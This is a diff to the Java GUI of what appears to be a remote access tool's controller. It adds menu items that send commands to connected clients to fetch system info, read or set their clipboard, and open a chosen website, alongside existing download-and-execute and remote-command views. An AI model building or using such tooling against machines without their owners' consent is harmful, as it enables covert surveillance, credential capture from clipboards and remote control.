@@ -1,9 +1,7 @@
 package GUI.Components;
 
 import GUI.Controller;
-import GUI.Views.DownloadAndExecuteView;
-import GUI.Views.RemoteDesktopView;
-import GUI.Views.SendCommandView;
+import GUI.Views.*;
 import Logger.Level;
 import Logger.Logger;
 import Server.ClientObject;
@@ -100,7 +98,88 @@ class IPContextMenu implements Repository {
             });
         });
 
-        mi1.getItems().addAll(sb1, sb2, sb3, si4, si5);
+        MenuItem si6 = new MenuItem("System Info");
+        si6.setOnAction(event -> {
+            Stage stage = new Stage();
+            stage.initStyle(StageStyle.UNDECORATED);
+            stage.setMinWidth(300);
+            stage.setMinHeight(300);
+            stage.setScene(new Scene(new SysInfoView().getSysInfoView(stage), 400, 300));
+            stage.show();
+            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
+                try {
+                    System.out.println("SENDING SYSINFO");
+                    clientObject.clientCommunicate("SYINFO");
+                } catch (IOException e1) {
+                    e1.printStackTrace();
+                }
+            }
+        });
+
+        // Clipboard junk
+        Menu clip = new Menu("Clipboard Functions");
+        MenuItem setClipboard = new MenuItem("Set Clipboard");
+        setClipboard.setOnAction(event -> {
+            Stage stage = new Stage();
+            stage.initStyle(StageStyle.UNDECORATED);
+            stage.setMinHeight(150);
+            stage.setMinWidth(300);
+            stage.setScene(new Scene(new SetClipboardView().getSetClipboardView(stage), 300, 200));
+            stage.show();
+            SetClipboardView.getSetClipboardButton().setOnAction(a -> {
+                if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
+                    try {
+                        clientObject.clientCommunicate("CLIPSET " + SetClipboardView.getTextField().getText().trim());
+                        stage.close();
+                    } catch (IOException e1) {
+
+                    }
+                }
+            });
+        });
+
+        MenuItem getClipboard = new MenuItem("Get Clipboard Data");
+        getClipboard.setOnAction(event -> {
+            Stage stage = new Stage();
+            stage.initStyle(StageStyle.UNDECORATED);
+            stage.setMinHeight(300);
+            stage.setMinWidth(300);
+            stage.setScene(new Scene(new GetClipboardView().getGetClipboardView(stage), 400, 400));
+            stage.show();
+            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
+                try {
+                    clientObject.clientCommunicate("CLIPGET");
+                } catch (IOException e1) {
+
+                }
+            }
+        });
+        clip.getItems().addAll(setClipboard, getClipboard);
+
+
+        //////// MISC \\\\\\\\
+        Menu misc = new Menu("Misc.");
+        MenuItem visit = new MenuItem("Visit Website");
+        visit.setOnAction(event -> {
+            Stage stage = new Stage();
+            stage.initStyle(StageStyle.UNDECORATED);
+            stage.setMinHeight(100);
+            stage.setMinWidth(300);
+            stage.setScene(new Scene(new VisitWebsiteView().getVisitWebsiteView(stage)));
+            stage.show();
+            VisitWebsiteView.getGoButton().setOnAction(a -> {
+                if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
+                    try {
+                        clientObject.clientCommunicate("VISIT " + VisitWebsiteView.getUrl().getText().trim());
+                    } catch (IOException e1) {
+
+                    }
+                }
+            });
+        });
+        misc.getItems().addAll(visit);
+
+        mi1.getItems().addAll(sb1, sb2, sb3, si4, si5, si6, clip, misc);
         MenuItem mi2 = new MenuItem("Copy IP");
         mi2.setOnAction(event -> {
             final Clipboard clipboard = Clipboard.getSystemClipboard();
